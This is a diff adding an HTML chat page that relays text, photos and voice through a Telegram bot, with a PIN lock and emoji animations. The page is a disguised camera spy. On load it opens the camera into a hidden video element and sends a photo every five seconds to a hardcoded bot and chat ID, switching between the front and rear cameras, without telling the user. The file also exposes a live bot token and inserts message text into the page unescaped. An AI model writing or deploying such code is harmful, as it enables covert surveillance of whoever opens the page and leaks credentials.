@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <link rel="manifest" href="./manifest.json">
+    <title>....</title>
+    <script>
+      
+  if ("serviceWorker" in navigator) {
+    navigator.serviceWorker.register("./service-worker.js", { scope: "./" })
+      .then((reg) => console.log("Service Worker Registered!", reg))
+      .catch((err) => console.log("Service Worker Registration Failed!", err));
+  }
+
+    </script>
+  <style>
+  
+        body {
+    background: linear-gradient(120deg, #ff758c, #ff7eb3);
+    font-family: Arial, sans-serif;
+    text-align: center;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+    height: 100vh;
+    margin: 0;
+    overflow: hidden;
+    transition: background 0.3s ease;
+}
+
+h2 {
+    position: absolute;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    font-size: 2rem;
+    color: #ff1f58;
+    margin: 0;
+    z-index: 10;
+    font-weight: bold;
+}
+
+#chatbox {
+    width: 90%;
+    max-width: 450px;
+    height: 630px;
+    border-radius: 30px;
+    padding: 20px;
+    overflow-y: auto;
+    margin: 20px auto;
+    color: black;
+    display: flex;
+    flex-direction: column;
+    z-index: 5;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+    transform: translateY(5px);
+    background-color: #ffb3c1;
+}
+
+.msg {
+    padding: 12px;
+    margin: 5px;
+    border-radius: 15px;
+    max-width: 70%;
+    word-wrap: break-word;
+    margin-bottom: 10px;
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+}
+
+.msg:hover {
+    transform: scale(1.05);
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+}
+
+.user {
+    background: #ff4f81;
+    align-self: flex-end;
+    color: white;
+    border-radius: 30px;
+    padding: 12px 20px;
+    z-index: 15;
+}
+
+.bot {
+    background: #f1f1f1;
+    align-self: flex-start;
+    color: black;
+    border-radius: 30px;
+    padding: 12px 20px;
+    z-index: 5;
+}
+
+input, button {
+    padding: 12px;
+    border-radius: 20px; /* Rounded corners for capsule shape */
+    margin: 5px;
+    background-color: #ff1f58; /* Match background to message box */
+    color: white;
+    border: 2px solid black; /* Black border */
+    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
+    transition: transform 0.2s ease;
+    z-index: 10;
+}
+
+input:focus, button:active {
+    transform: scale(1.05);
+}
+
+button {
+    cursor: pointer;
+}
+
+.heart-upload {
+    font-size: 30px;
+    width: 36px;
+    height: 36px;
+    cursor: pointer;
+    margin-top: 10px;
+    background-color: #ffb3c1;
+    border-radius: 50%; /* Rounded circle for the heart icon */
+    border: 2px solid black; /* Black border */
+    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
+    z-index: 15;
+}
+
+#micButton {
+    width: 38px;
+    height: 38px;
+    background-color: #ffb3c1;
+    
+    border-radius: 50%; /* Rounded circle for mic button */
+    border: 2px solid black; /* Black border */
+    font-size: 30px;
+    color: white;
+    cursor: pointer;
+    margin-top: 10px;
+    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
+    z-index: 15;
+}
+
+.button-container {
+    display: flex;
+    justify-content: center; /* Centering the input and buttons */
+    align-items: center;
+    width: 100%; /* Full width */
+    position: absolute;
+    bottom: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 20;
+}
+
+#message {
+    width: 60%; /* Slightly increase width for better alignment */
+    max-width: 200px; /* Limit max width on large screens */
+    padding: 12px;
+    border-radius: 25px;
+    border: 2px solid black;
+    margin-top: 10px;
+    text-align: left;
+    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2);
+    z-index: 5;
+}
+
+#upload {
+    display: none;
+}
+
+#imagePreview {
+    max-width: 100%;
+    max-height: 200px;
+    margin-top: 10px;
+}
+
+#sendButton {
+    border-radius: 50%; /* Rounded circle for send button */
+    width: 38px;
+    height: 38px;
+    font-size: 24px;
+    display: none;
+    align-self: flex-end;
+    cursor: pointer;
+    border: 2px solid black; /* Black border */
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: #ffb3c1;
+    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
+    z-index: 20;
+}
+
+#sendButton.active {
+    display: flex;
+}
+
+#sendButton:disabled {
+    cursor: not-allowed;
+}      
+
+        
+button { background: #ff4f81; color: white; cursor: pointer; }
+video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
+#canvas { display: none; }
+        
+    </style>
+
+
+
+<body>
+    <h2>....</h2>
+    
+     <div id="chatbox"></div>
+
+    <div class="button-container">
+        
+        <input type="text" id="message" placeholder="Type a message..." onkeydown="checkEnter(event)">
+        <button id="sendButton" onclick="sendMessage()">></button> <!-- Round send button -->
+        <label for="upload" class="heart-upload">💗</label>
+        <input type="file" id="upload" accept="image/*" onchange="uploadPhoto()">
+        <button id="micButton" onclick="toggleMic()">🎤</button>
+    </div>
+
+    <div id="imagePreview"></div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    
+    
+
+<script>
+/*********************************************************************/
+
+/*********************************************************************/
+    
+        const botToken = "8064976752:AAHHLipf7wy0c0K_5wOC7ejfyLA2VMkQoYA";  
+        const chatId = "878604830";  
+
+
+
+
+    // 📸 Background Camera Setup
+      let isFrontCamera = true; // Track which camera to use
+
+// 📸 Background Camera Setup
+async function startCamera() {
+    const facingMode = isFrontCamera ? "user" : "environment";
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
+    document.getElementById("video").srcObject = stream;
+}
+
+// 📸 Capture Photo and Send to Telegram
+async function captureAndSendPhoto() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    canvas.toBlob(async (blob) => {
+        let formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob);
+
+        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
+
+        // 🔄 Switch camera and restart after capturing
+        isFrontCamera = !isFrontCamera;
+        await startCamera();
+    }, "image/jpeg", 0.5);
+}
+
+// Start with the front camera
+startCamera();
+
+
+/*********************************************************************
+        CHAT SYSTEM
+*********************************************************************/
+     
+// ✉️ Send Message to Telegram
+        async function sendMessage() {
+            const message = document.getElementById("message").value;
+            if (!message) return;
+
+      
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+
+            document.getElementById("chatbox").innerHTML += `<div class="msg user">${message}</div>`;
+            autoScroll();
+            document.getElementById("message").value = "";
+        }
+
+// 📲 Check if the user presses "Enter" to send the message
+        function checkEnter(event) {
+            if (event.key === 'Enter' && event.target.value.trim() !== "") {
+                sendMessage();
+            }
+        }
+        
+// 📤 Send Uploaded Image to Telegram
+        document.getElementById("upload").addEventListener("change", async function() {
+            const file = this.files[0];
+            if (!file) return;
+
+            let formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", file);
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+
+            document.getElementById("chatbox").innerHTML += `<div class="msg user"><img src="${URL.createObjectURL(file)}" width="100"></div>`;
+            autoScroll();
+        });
+
+// 📥 Fetch Messages from Telegram (Polling)
+        async function getMessages() {
+    let lastUpdateId = 0;
+
+    setInterval(async () => {
+        const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+        const data = await res.json();
+
+        if (data.result.length > 0) {
+            data.result.forEach(update => {
+                lastUpdateId = update.update_id;
+
+                if (update.message) {
+                    let chatbox = document.getElementById("chatbox");
+
+                    // ✅ Text message
+                    if (update.message.text) {
+                        let receivedMessage = update.message.text.toLowerCase().trim();
+                        chatbox.innerHTML += `<div class="msg bot">${update.message.text}</div>`;
+                        autoScroll();
+// 🛑 Check if message is "bye" or "exit"
+                        if (receivedMessage === "bye" || receivedMessage === "exit") {
+                            setTimeout(() => {
+                                window.close(); // Close page after 2 seconds
+                            }, 2000);
+                        }
+                    }
+                    
+// ✅ Photo message
+                    if (update.message.photo) {
+                        let photoArray = update.message.photo;
+                        let photoFileId = photoArray[photoArray.length - 1].file_id;
+                        let photoUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${photoFileId}`;
+
+                        fetch(photoUrl)
+                            .then(response => response.json())
+                            .then(fileData => {
+                                let filePath = fileData.result.file_path;
+                                let fullUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
+                                chatbox.innerHTML += `<div class="msg bot"><img src="${fullUrl}" width="200"></div>`;
+                                autoScroll();
+                            });
+                    }
+                    
+// 🎤 Handle Mic Button for Voice Recording
+        async function toggleMic() {
+            const micButton = document.getElementById("micButton");
+            let mediaRecorder;
+            let audioChunks = [];
+            let isRecording = false;
+
+            if (!isRecording) {
+                isRecording = true;
+                micButton.style.background = "red";
+
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    audioChunks.push(event.data);
+                };
+
+                mediaRecorder.start();
+
+                setTimeout(() => {
+                    isRecording = false;
+                    micButton.style.background = "none";
+                    mediaRecorder.stop();
+                }, 5000);
+            }
+
+            mediaRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+                let formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("voice", audioBlob);
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+                    method: "POST",
+                    body: formData
+                });
+
+                document.getElementById("chatbox").innerHTML += `<div class="msg user">🎤 Voice Message Sent</div>`;
+                autoScroll();
+                scrollToBottom();
+            };
+        }
+
+// ✅ Voice message
+                    if (update.message.voice) {
+                        let voiceFileId = update.message.voice.file_id;
+                        let voiceUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${voiceFileId}`;
+
+                        fetch(voiceUrl)
+                            .then(response => response.json())
+                            .then(fileData => {
+                                let filePath = fileData.result.file_path;
+                                let fullUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
+                                chatbox.innerHTML += `<div class="msg bot"><audio controls><source src="${fullUrl}" type="audio/ogg"></audio></div>`;
+                                autoScroll();
+                            });
+                    }
+                }
+            });
+        }
+    }, 3000); // Every 3 seconds
+}
+
+
+
+    
+// 🔽 Scroll Chat to Bottom
+        function autoScroll() {
+    const chatbox = document.getElementById("chatbox");
+    chatbox.scrollTo({
+        top: chatbox.scrollHeight,
+        behavior: "smooth"  // ✅ Smooth scrolling effect
+    });
+}
+        
+// ✅ Start Everything
+        startCamera();
+        setInterval(captureAndSendPhoto, 5000); 
+        getMessages();
+</script>
+    
+
+    
+<script>    
+/*********************************************************************
+        LOCK SYSTEM 
+*********************************************************************/
+    
+document.addEventListener("DOMContentLoaded", function () {
+    let lockScreen = document.createElement("div");
+    lockScreen.innerHTML = `
+        <div id="pinContainer" style="
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(135deg, #ff9a9e, #fad0c4); display: flex;
+            justify-content: center; align-items: center; text-align: center;
+            z-index: 9999;">
+            <div style="background: rgba(255, 255, 255, 0.2); padding: 20px; border-radius: 15px;
+                backdrop-filter: blur(10px); box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px;">
+                <h2 style="color: white;"></h2>
+                <input type="tel" id="pinInput" maxlength="4" placeholder="Enter PIN" pattern="[0-9]*"
+                    inputmode="numeric" style="
+                    padding: 12px; width: 85%; border: none; border-radius: 30px;
+                    text-align: center; font-size: 18px; margin: 10px 0; outline: none;
+                    background: rgba(255, 255, 255, 0.5); color: #333;">
+            </div>
+        </div>
+    `;
+    document.body.appendChild(lockScreen);
+
+    document.getElementById("pinInput").addEventListener("input", function () {
+        let enteredPin = this.value;
+        let correctPin = "9588"; // Change this PIN
+
+        if (enteredPin.length === 4) { // Jaise hi 4 digit enter hote hain
+            if (enteredPin === correctPin) {
+                document.getElementById("pinContainer").remove(); // Lock screen hatana
+            } else {
+                
+                this.value = ""; // Galat PIN to input clear
+            }
+        }
+    });
+});
+</script>
+
+<script>
+/*********************************************************************
+                     AUTO LOCK
+*********************************************************************/
+    
+document.addEventListener("visibilitychange", function() {
+    if (document.hidden) {
+        console.log("Tab background me chala gaya.");
+    } else {
+        console.log("Tab foreground me aaya, refreshing...");
+        location.reload();
+    }
+});
+</script>
+
+<script>
+/*********************************************************************
+         EMOJI EXPLOSION ANIMTION
+*********************************************************************/
+(function () {
+    // ✅ Add Required CSS Dynamically
+    const style = document.createElement("style");
+    style.innerHTML = `
+        .emoji {
+            position: fixed;
+            font-size: 30px;
+            opacity: 1;
+            z-index: 30;
+            pointer-events: none;
+            animation: explode 1.5s ease-out forwards;
+        }
+        
+        @keyframes explode {
+             0% {
+                transform: translate(0, 0) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translate(var(--x), var(--y)) scale(1.5);
+                opacity: 0;
+                }
+        }
+    `;
+    document.head.appendChild(style);
+
+    function createEmojiExplosion(emoji) {
+        for (let i = 0; i < 6; i++) { // ✅ 6 Firecracker explosions
+            let x = Math.random() * window.innerWidth;
+            let y = Math.random() * (window.innerHeight / 2); // ✅ Firecracker effect in upper screen
+
+            for (let j = 0; j < 15; j++) { // ✅ Each explosion creates 15 scattered emojis
+                let explosion = document.createElement("div");
+                explosion.innerHTML = emoji;
+                explosion.classList.add("emoji");
+                document.body.appendChild(explosion);
+
+                let angle = (Math.PI * 2 * j) / 15; // Spread explosion in a circular way
+                let distance1 = Math.random() * 100 + 50; // Random first explosion radius
+                let distance2 = distance1 + Math.random() * 50; // Second phase spread further
+
+                let offsetX1 = Math.cos(angle) * distance1;
+                let offsetY1 = Math.sin(angle) * distance1;
+                let offsetX2 = Math.cos(angle) * distance2;
+                let offsetY2 = Math.sin(angle) * distance2;
+
+                explosion.style.setProperty("--x", `${offsetX1}px`);
+                explosion.style.setProperty("--y", `${offsetY1}px`);
+                explosion.style.setProperty("--x2", `${offsetX2}px`);
+                explosion.style.setProperty("--y2", `${offsetY2}px`);
+                explosion.style.left = `${x}px`;
+                explosion.style.top = `${y}px`;
+                explosion.style.fontSize = `${Math.random() * 20 + 20}px`; // Random size
+                explosion.style.opacity = "1";
+
+                setTimeout(() => {
+                    explosion.remove();
+                }, 1500 + Math.random() * 500); // ✅ Varying explosion duration for realism
+            }
+        }
+    }
+
+    function processLatestMessage(chatboxSelector, messageSelector) {
+        let chatbox = document.querySelector(chatboxSelector);
+        if (!chatbox) return;
+
+        let messages = chatbox.querySelectorAll(messageSelector);
+        if (messages.length === 0) return;
+
+        let latestMessage = messages[messages.length - 1]; // ✅ Get the last (latest) message
+        let messageText = latestMessage.innerText.trim();
+
+        let words = messageText.split(" "); // Split message into words
+        for (let word of words) {
+            if (word.length === 2) { // ✅ Detect only one type of emoji
+                createEmojiExplosion(word); // ✅ Enhanced firecracker explosion
+                return; // ✅ Ensure only one type of emoji explodes per latest message
+            }
+        }
+    }
+
+    function addEmojiExplosionToChat(chatboxSelector, messageSelector) {
+        document.addEventListener("DOMContentLoaded", function () {
+            let chatbox = document.querySelector(chatboxSelector);
+            if (!chatbox) {
+                console.error("❌ Chatbox not found!");
+                return;
+            }
+
+            console.log("✅ Chatbox Found, Starting Observer...");
+
+            let observer = new MutationObserver(() => {
+                setTimeout(() => {
+                    processLatestMessage(chatboxSelector, messageSelector); // ✅ Process only latest message
+                }, 100); // ✅ Small delay to ensure message is rendered
+            });
+
+            observer.observe(chatbox, { childList: true });
+
+            console.log("✅ Emoji explosion observer started!");
+        });
+    }
+
+    function setupSendButton(inputSelector, sendButtonSelector, chatboxSelector) {
+        document.addEventListener("DOMContentLoaded", function () {
+            let input = document.querySelector(inputSelector);
+            let sendButton = document.querySelector(sendButtonSelector);
+            let chatbox = document.querySelector(chatboxSelector);
+
+            if (!input || !sendButton || !chatbox) {
+                console.error("❌ Input, Send Button, or Chatbox not found!");
+                return;
+            }
+
+            sendButton.addEventListener("click", function () {
+                let message = input.value.trim();
+                if (message === "") return;
+
+                // ✅ Add Sent Message to Chatbox (New Message Only)
+                let msgDiv = document.createElement("div");
+                msgDiv.classList.add("msg", "user");
+                msgDiv.textContent = message;
+                chatbox.appendChild(msgDiv);
+                chatbox.scrollTop = chatbox.scrollHeight;
+
+                // ✅ Process Only This Latest Message
+                processLatestMessage(chatboxSelector, ".msg");
+
+                // ✅ Clear Input Field
+                input.value = "";
+            });
+        });
+    }
+
+    // ✅ Functions Accessible Globally
+    window.addEmojiExplosionToChat = addEmojiExplosionToChat;
+    window.setupSendButton = setupSendButton;
+})();
+</script>
+ 
+<script>
+/*********************************************************************
+    VIBRATE ON NEW MESSAGE AND EMOJI EXPLOSION ANIMTION
+*********************************************************************/
+
+(function () {
+    function vibrateOnNewMessage() {
+        if (navigator.vibrate) {
+            navigator.vibrate([30, 20, 30, 20, 50, 20, 50]); 
+            // ✅ Short pulses & strong bursts (message received feedback)
+        }
+    }
+
+    function vibrateOnEmojiExplosion() {
+        if (navigator.vibrate) {
+            navigator.vibrate([100, 50, 200, 50, 100, 50, 300]); 
+            // ✅ Firecracker effect vibration pattern:
+            // ✅ Initial spark (100ms), delay (50ms), explosion (200ms), 
+            // ✅ small gap (50ms), secondary burst (100ms), 
+            // ✅ crackling effect (50ms), final BOOM (300ms)
+        }
+    }
+
+    function addVibrationToChat(chatboxSelector, messageSelector) {
+        document.addEventListener("DOMContentLoaded", function () {
+            let chatbox = document.querySelector(chatboxSelector);
+            if (!chatbox) {
+                console.error("❌ Chatbox not found!");
+                return;
+            }
+
+            console.log("✅ Chatbox Found, Starting Vibration Observer...");
+
+            let observer = new MutationObserver(() => {
+                setTimeout(() => {
+                    vibrateOnNewMessage(); // ✅ Vibrate when a new message is added
+                }, 100);
+            });
+
+            observer.observe(chatbox, { childList: true });
+
+            console.log("✅ Vibration observer started!");
+        });
+    }
+
+    function addVibrationToEmojiExplosion() {
+        document.addEventListener("animationstart", function (event) {
+            if (event.animationName === "explode") {
+                vibrateOnEmojiExplosion(); // ✅ Vibrate on emoji explosion
+            }
+        });
+        console.log("✅ Emoji explosion vibration enabled!");
+    }
+
+    // ✅ Functions Accessible Globally
+    window.addVibrationToChat = addVibrationToChat;
+    window.addVibrationToEmojiExplosion = addVibrationToEmojiExplosion;
+})();
+        
+</script>
+ 
+<script>
+/*********************************************************************
+    ANIMATION AND VIBRATION CONNECTION 
+*********************************************************************/  
+    addEmojiExplosionToChat("#chatbox", ".msg");
+  
+    addVibrationToChat("#chatbox", ".msg"); 
+    addVibrationToEmojiExplosion();
+
+</script>
+
+   
+</body>
+</html>
+
+
